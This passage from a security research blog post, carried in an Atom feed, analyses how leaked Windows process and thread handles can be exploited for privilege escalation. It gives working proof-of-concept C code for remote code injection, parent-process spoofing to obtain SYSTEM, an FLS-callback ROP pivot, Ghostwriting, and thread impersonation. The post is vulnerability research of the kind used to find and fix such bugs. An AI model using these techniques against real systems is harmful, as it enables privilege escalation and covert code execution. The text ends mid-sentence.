<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: windows | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/windows/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploiting Leaked Process and Thread Handles]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/"/>
    <updated>2019-08-22T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles</id>
    <content type="html"><![CDATA[<p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t always granted
<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
This post will address the various access rights assignable to handles and what we
can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
specifically on process and thread handles as this seems to be the most common,
but surely other objects can be exploited in similar manner.</p>

<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
commonly seen it manifest when some privileged process opens a handle with
<code>bInheritHandle</code> set to true. Once this happens, any child process of this
privileged process inherits the handle and all access it grants. As example,
assume a SYSTEM level process does this:</p>

<p><code>
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
</code></p>

<p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
will gain access to it. If they execute userland code impersonating the desktop
user, as a service might often do, those userland processes will have access to
that handle.</p>

<h2>Existing bugs</h2>

<p>There are several public bugs we can point to over the years as example and
inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
he&rsquo;s able to leak a privileged thread handle out of the secondary logon
service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
he exploited it in a novel way that I was unaware of, at the time.</p>

<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing
Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
identifies the JIT server process mapping memory into the content process. To
do this, the JIT process needs a handle to it. The content process calls
<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
exploited to obtain a full access handle.</p>

<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
was obtained from a privileged process. They were able to exploit this via a
dropped DLL and an APC.</p>

<h2>Setup</h2>

<p>In this post, I wanted to examine all possible access rights to determine which
were exploitable on there own and which were not. Of those that were not, I
tried to determine what concoction of privileges were necessary to make it so.
I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
you&rsquo;ll find in the wild, and this post reflects that.</p>

<p>For testing, I created a simple client and server: a privileged server that
leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>

<p>```</p>

<h1>include &ldquo;pch.h&rdquo;</h1>

<h1>include <iostream></h1>

<h1>include &lt;Windows.h></h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>if (argc &lt;= 1) {
    printf("[-] Please give me a target PID\n");
    return -1;
}

HANDLE hUserToken, hUserProcess;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;

ZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&amp;pi, sizeof(pi));

hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &amp;hUserToken)) {
    printf("[-] Failed to open user process: %d\n", GetLastError());
    CloseHandle(hUserProcess);
    return -1;
}

hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
printf("[+] Process: %x\n", hProcess);

CreateProcessAsUserA(hUserToken, 
    "VulnServiceClient.exe", 
    NULL, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
SuspendThread(hThread);
return 0;
</code></pre>

<p>}
```</p>

<p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
opening an inheritable handle to the current process (which we&rsquo;re running as
SYSTEM), then spawning a child process. This child process is simply my client
application, which will go about attempting to exploit the handle.</p>

<p>The client is, of course, a little more involved. The only component that needs
a little discussion up front is fetching the leaked handle. This can be done
via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>

<p>```
void ProcessHandles()
{</p>

<pre><code>HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
_NtQuerySystemInformation NtQuerySystemInformation =
    (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
_NtDuplicateObject NtDuplicateObject =
    (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
_NtQueryObject NtQueryObject =
    (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
_RtlEqualUnicodeString RtlEqualUnicodeString =
    (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
_RtlInitUnicodeString RtlInitUnicodeString = 
    (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

ULONG handleInfoSize = 0x10000;
NTSTATUS status;
PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
DWORD dwPid = GetCurrentProcessId();


printf("[+] Looking for process handles...\n");

while ((status = NtQuerySystemInformation(
    SystemHandleInformation,
    phHandleInfo,
    handleInfoSize,
    NULL
)) == STATUS_INFO_LENGTH_MISMATCH)
    phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);

if (status != STATUS_SUCCESS)
{
    printf("NtQuerySystemInformation failed!\n");
    return;
}

printf("[+] Fetched %d handles\n", phHandleInfo-&gt;HandleCount);

// iterate handles until we find the privileged process
for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
{
    SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    PVOID objectNameInfo;
    UNICODE_STRING objectName;
    ULONG returnLength;

    // Check if this handle belongs to the PID the user specified
    if (handle.ProcessId != dwPid)
        continue;

    objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
    if (NtQueryObject(
        (HANDLE)handle.Handle,
        ObjectTypeInformation,
        objectTypeInfo,
        0x1000,
        NULL
    ) != STATUS_SUCCESS)
        continue;

    if (handle.GrantedAccess == 0x0012019f)
    {
        free(objectTypeInfo);
        continue;
    }

    objectNameInfo = malloc(0x1000);
    if (NtQueryObject(
        (HANDLE)handle.Handle,
        ObjectNameInformation,
        objectNameInfo,
        0x1000,
        &amp;returnLength
    ) != STATUS_SUCCESS)
    {
        objectNameInfo = realloc(objectNameInfo, returnLength);
        if (NtQueryObject(
            (HANDLE)handle.Handle,
            ObjectNameInformation,
            objectNameInfo,
            returnLength,
            NULL
        ) != STATUS_SUCCESS)
        {
            free(objectTypeInfo);
            free(objectNameInfo);
            continue;
        }
    }

    // check if we've got a process object; there should only be one, but should we 
    // have multiple, this is where we'd perform the checks
    objectName = *(PUNICODE_STRING)objectNameInfo;
    UNICODE_STRING pProcess, pThread;

    RtlInitUnicodeString(&amp;pThread, L"Thread");
    RtlInitUnicodeString(&amp;pProcess, L"Process");
    if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pProcess, TRUE) &amp;&amp; TARGET == 0) {
        printf("[+] Found process handle (%x)\n", handle.Handle);
        HANDLE hProcess = (HANDLE)handle.Handle;
    }
    else if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pThread, TRUE) &amp;&amp; TARGET == 1) {
        printf("[+] Found thread handle (%x)\n", handle.Handle);
        HANDLE hThread = (HANDLE)handle.Handle;
    else
        continue;

    free(objectTypeInfo);
    free(objectNameInfo);
}
</code></pre>

<p>}
```</p>

<p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
belonging to our process, then hunting for a thread or a process. In a more
active client process with many threads or process handles we&rsquo;d need to filter
down further, but this is sufficient for testing.</p>

<p>The remainder of this post will be broken down into process and thread security
access rights.</p>

<h2>Process</h2>

<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
apply more to the handle itself than what it allows one to do.</p>

<p>Right off the bat, we&rsquo;re going to dismiss the following:
<code>
PROCESS_QUERY_INFORMATION
PROCESS_QUERY_LIMITED_INFORMATION
PROCESS_SUSPEND_RESUME
PROCESS_TERMINATE
PROCESS_SET_QUOTA
PROCESS_VM_OPERATION
PROCESS_VM_READ
SYNCHRONIZE
</code>
To be clear I&rsquo;m only suggesting that the above access rights cannot be
exploited on their own; they are, of course, very useful when roped in with
others. There may be weird edge cases in which one of these might be useful
(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>

<p>That leaves the following:
<code>
PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_SET_INFORMATION
PROCESS_VM_WRITE
</code></p>

<p>We&rsquo;ll run through each of these individually.</p>

<h3>PROCESS_ALL_ACCESS</h3>

<p>The most obvious of them all, this one grants us access to it all. We can
simply allocate memory and create a thread to obtain code execution:
<code>
char payload[] = "\xcc\xcc";
LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);
</code></p>

<p>Nothing to it.</p>

<h3>PROCESS_CREATE_PROCESS</h3>

<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
child processes. To do this remotely, we just need to spawn a process and set
its parent to the privileged process we&rsquo;ve got a handle to. This will create
the new process and inherit its parent token which will hopefully be a SYSTEM
token.</p>

<p>Here&rsquo;s how we do that:
```</p>

<pre><code>STARTUPINFOEXA sinfo = { sizeof(sinfo) };
PROCESS_INFORMATION pinfo;
LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
SIZE_T bytes;

sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
InitializeProcThreadAttributeList(NULL, 1, 0, &amp;bytes);
ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
InitializeProcThreadAttributeList(ptList, 1, 0, &amp;bytes);

UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hPrivProc, sizeof(HANDLE), NULL, NULL);
sinfo.lpAttributeList = ptList;

CreateProcessA("cmd.exe", (LPSTR)"cmd.exe /c calc.exe", 
        NULL, NULL, TRUE, 
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
        &amp;sinfo.StartupInfo, &amp;pinfo);
</code></pre>

<p>```</p>

<p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
to replace that with something more useful!</p>

<h3>PROCESS_CREATE_THREAD</h3>

<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
memory in the target process. There are of course ways we can influence memory
without direct write access, such as WNF, but we&rsquo;d still have no way of
resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
candidates for executing child processes or loading arbitrary code.</p>

<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
call to pop a shell:</p>

<p>```
DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L"msvcrt.dll") + 0x503b8);
HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,</p>

<pre><code>                    (LPTHREAD_START_ROUTINE)WinExec, 
                    (LPVOID)dwCmd, 
                    0, NULL);
</code></pre>

<p>```</p>

<p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
the system path containing a writable directory for our user.</p>

<h3>PROCESS_DUP_HANDLE</h3>

<p>Microsoft&rsquo;s own documentation on process security and access rights points to
this specifically as a sensitive right. Using it, we can simply duplicate our
process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>

<p><code>
HANDLE hDup = INVALID_HANDLE_VALUE;
DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &amp;hDup, PROCESS_ALL_ACCESS, 0, 0)
</code></p>

<p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
executing arbitrary code.</p>

<h3>PROCESS_SET_INFORMATION</h3>

<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
example). Process Hacker[15] maintains an up to date definition of this class
and its members.</p>

<p>Of the available flags, none were particularly interesting on their own. I
needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
that point we defeat the purpose.</p>

<h3>PROCESS_VM_*</h3>

<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
should be self-explanatory and the third allows one to operate on the virtual
address space itself, such as changing page protections (VirtualProtectEx) or
allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
approach. Ditto with <code>PROCESS_VM_READ</code>.</p>

<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
come up with a generic solution. At first blush, the entire set of
Shatter-like injection strategies documented by Hexacorn[12] seem like
they&rsquo;d be perfect. They simply require the remote process to use windows,
clipboard registrations, etc. None of these are guaranteed, but chances are one
is bound to exist. Unfortunately for us, many of them restrict access across
sessions or scaling integrity levels. We can write into the remote process,
but we need some way to gain control over execution flow.</p>

<p>In addition to being unable to modify page permissions, we cannot read nor
map/allocate memory. There are plenty of ways we can leak memory from the
remote process without directly interfacing with it, however.</p>

<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
inside a remote process regardless of its IL. This grants us a list of
<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
the remote process PEB address. This latter API requires the
<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
off. If someone knows of a way to leak the address of a remote process PEB
without it, I&rsquo;d love to hear.</p>

<p>The approach I took was a bit loopy, but it ended up working reliably and
generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>

<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
primary thread of a process will always setup a fiber, thus there will always
be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
smashing the FlsCallback we can obtain control over execution flow when one of
the fiber actions are taken.</p>

<p>With only write access to the process, however, this becomes a bit convoluted.
We cannot allocate memory and so we need some known location to put the
payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
pointers and we&rsquo;re unable to read these.</p>

<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
we can leak PEB/TEB addresses we already have two powerful primitives. After
looking over both structures, I found that thread local storage (TLS) happened
to provide us with enough room to store ROP gadgets and a thin payload. TLS is
embedded within the structure itself, so we can simply offset into the TEB
address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
fantastic and have aged well[14].</p>

<p>Gaining control over the callback was a little trickier. A pointer to a
<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
way of overwriting the pointer. Or do we?</p>

<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
pretty simple structure and really only has one value of importance: the
callback pointer.</p>

<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
This will allow us to stack pivot and continue executing our ROP payload. This
requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
overwrite this value and craft my own data structure, which also turned out to
be pretty simple. The TLS buffer ended up looking like this:</p>

<p>```</p>

<pre><code>//
// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
// 32 ] 41414141 41414141 41414141 41414141 
//
</code></pre>

<p>```</p>

<p>There just so happens to be a perfect stack pivot gadget located in
<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>

<p><code>
7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
7603c41b c20400          ret     4
</code></p>

<p>Putting this all together, execution results in:</p>

<p><code>
eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x115:
7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
ds:0023:7ffdee2c=7ffdee30
0:000&gt; p
eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x11b:
7603c41b c20400          ret     4
0:000&gt; dd esp l3
7ffdee30  41414141 41414141 41414141
</code></p>

<p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
some other payload, I took a quick and lazy strategy and simply called
<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
well, is reliable, and even on process exit will execute and block, depending
on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>

<p>```</p>

<pre><code>_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");

LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
if (hProcess == NULL)
    return;

SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
TlsAddr = RemoteTeb + 0xe10;

SIZE_T RemotePeb = GetRemotePeb(hProcess);
SIZE_T PivotGadget = 0x7603c415;
SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;

//
// construct our TlsSlots payload:
// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
// 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
// 48 ] 41414141
//

memset(lpBuf, 0x0, 16);
*((DWORD*)lpBuf + 2) = PivotGadget;
*((DWORD*)lpBuf+ 4) = 0;
*((DWORD*)lpBuf + 5) = 0;
*((DWORD*)lpBuf + 6) = StackAddress;

StackAddress = TlsAddr + 32;
*((DWORD*)lpBuf + 7) = StackAddress;
*((DWORD*)lpBuf + 8) = LoadLibA;
*((DWORD*)lpBuf + 9) = 0x41414141; // junk
*((DWORD*)lpBuf + 10) = RtlExitThread;
*((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
*((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)

NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);

// update FlsCallback in PEB and FlsData in TEB
StackAddress = TlsAddr + 12;
NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&amp;StackAddress, sizeof(SIZE_T), NULL);
NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&amp;TlsAddr, sizeof(SIZE_T), NULL);
</code></pre>

<p>```</p>

<p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
callback is executed (just close the process). As a note, we&rsquo;re using
<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
<code>PROCESS_VM_OPERATION</code> which we may not have.</p>

<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
This gives us visibility into the address space, but we still cannot allocate
or map memory into the remote process. Using the above strategy we can rid
ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
PEB address out of TEB.</p>

<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
can now allocate memory and change page permissions. This allows us to more
easily use the above strategy, but also perform inline and IAT hooks.</p>

<h2>Thread</h2>

<p>As with the process handles, there are a handful of access rights we can dismiss
immediately:
<code>
SYNCHRONIZE
THREAD_QUERY_INFORMATION
THREAD_GET_CONTEXT
THREAD_QUERY_LIMITED_INFORMATION
THREAD_SUSPEND_RESUME
THREAD_TERMINATE
</code></p>

<p>Which leaves the following:
<code>
THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_IMPERSONATE
THREAD_SET_CONTEXT
THREAD_SET_INFORMATION
THREAD_SET_LIMITED_INFORMATION
THREAD_SET_THREAD_TOKEN
</code></p>

<h3>THREAD_ALL_ACCESS</h3>

<p>There&rsquo;s quite a lot we can do with this, including everything described in the
following thread access rights sections. I personally find the
<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>

<p>There is another option that is a bit more arcane, but equally viable. Note
that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
What we do have, however, is a series of APIs that sort of grant us that:
<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
injection technique dubbed Ghostwriting[6] was released to little fanfare. In
it, the author describes a code injection strategy that does not require the
typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
even OpenProcess.</p>

<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
calls in tandem with a set of specific assembly gadgets to write a payload,
dword by dword, onto the threads stack. Once written, they use
<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
their payload.</p>

<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>

<p><code>
MOV [REG1], REG2
RET
</code></p>

<p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
my write function:</p>

<p>```
void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
{</p>

<pre><code>SetContextRegister(&amp;context, g_rside, WriteWhat);
SetContextRegister(&amp;context, g_lside, WriteWhere);

context.Rsp = StackBase;
context.Rip = MovAddr;

WaitForThreadAutoLock(hThread, &amp;context, JmpAddr);
</code></pre>

<p>}
```</p>

<p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
appropriate registers. Once those are set, we set our stack base (adjusted from
threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
write our <code>JMP $</code> gadget to the stack.</p>

<p>They use what they call a thread auto lock to control execution flow (edits
mine):</p>

<p>```
void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
{</p>

<pre><code>SetThreadContext(Thread,PThreadContext);

do
{
    ResumeThread(Thread);
    Sleep(30); 
    SuspendThread(Thread);
    GetThreadContext(Thread,PThreadContext);
}
while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
</code></pre>

<p>}
```</p>

<p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>

<p>Once our execution hits the jump, we have our write primitive. We can now
simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
any values we want.</p>

<p>I ported the core function of this technique to x64 to demonstrate its
viability. Instead of using it to execute an entire payload, I simply execute
<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
available on Github[11]. Turning it into something production ready is left as
an exercise for the reader ;)</p>

<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
it, it&rsquo;s probably more production ready and usable than mine.</p>

<h3>THREAD_DIRECT_IMPERSONATION</h3>

<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
impersonated, not simply TO impersonate. Exploiting this is simply a matter of
using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
Using this we&rsquo;re able to create a thread totally under our control and
impersonate the privileged one:</p>

<p><code>
hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &amp;dwTid);
NtImpersonateThread(hNewThread, hThread, &amp;sqos);
</code></p>

<p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
whatever we need under the privileged impersonation context.</p>

<h3>THREAD_IMPERSONATE</h3>

<p>Unfortunately I was unable to identify a surefire, generic method for
exploiting this one. We have no ability to query the remote thread, nor can we
gain any control over its execution flow. We&rsquo;re simply allowed to manage its
impersonation state.</p>

<p>We can use this to force the privileged thread to impersonate us, using the
<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
application. For example, if the service were to create shared resources under
a user context for which it would typically be SYSTEM, such as a file, we can
gain ownership over that file. If multiple privileged threads access it for
information (such as configuration) it could lead to code execution.</p>

<h3>THREAD_SET_CONTEXT</h3>

<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
thread, it needs to enter an alertable state. This happens when a specific set
of win32 functions are executed, so it is entirely possible that the thread
never becomes alertable.</p>

<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
handy. Using it, we can force the thread to become alertable via the
<code>NtTestAlert</code> function. Of course, we have no ability to call
<code>GetThreadContext</code> and will therefore likely lose control of the thread after
exploitation.</p>

<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
replicate the Ghostwriting code injection technique discussed in the
<code>THREAD_ALL_ACCESS</code> section above.</p>

<h3>THREAD_SET_INFORMATION</h3>

<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
<code>NtSetInformationThread</code>. After looking through all of these, I did not
identify any immediate ways in which we could influence the remote thread. Some
of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
require <code>SeDebugPrivilege</code> or similar.</p>

<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
really not a lot of juicy stuff that can be done via the available functions</p>

<h3>THREAD_SET_LIMITED_INFORMATION</h3>

<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
anywhere near an exploitable primitive.</p>

<h3>THREAD_SET_THREAD_TOKEN</h3>

<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
method of abusing this right. I can set the thread&rsquo;s token or modify a few
fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>

<h2>Conclusion</h2>

<p>I was a little disappointed in how uneventful thread rights seemed to be.
Almost half of them proved to be unexploitable on their own, and even in
combination did not turn much up. As per above, having one of the following
three privileges is necessary to turn a leaked thread handle into something
exploitable:</p>

<p><code>
THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_SET_CONTEXT
</code></p>

<p>Missing these will require a deeper understanding of your target and some
